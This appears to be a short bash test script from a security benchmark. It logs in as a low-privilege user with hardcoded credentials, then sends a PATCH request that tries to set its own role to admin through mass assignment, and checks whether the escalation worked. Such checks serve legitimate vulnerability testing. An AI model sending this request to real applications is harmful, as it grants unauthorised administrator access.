#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123! >/dev/null
curl -fsS -b "$JAR" -X PATCH "$TARGET/api/users/me" -H "$json_ct" -d '{"displayName":"pwn","role":"admin","isAdmin":true}' | grep -q '"role":"admin"'
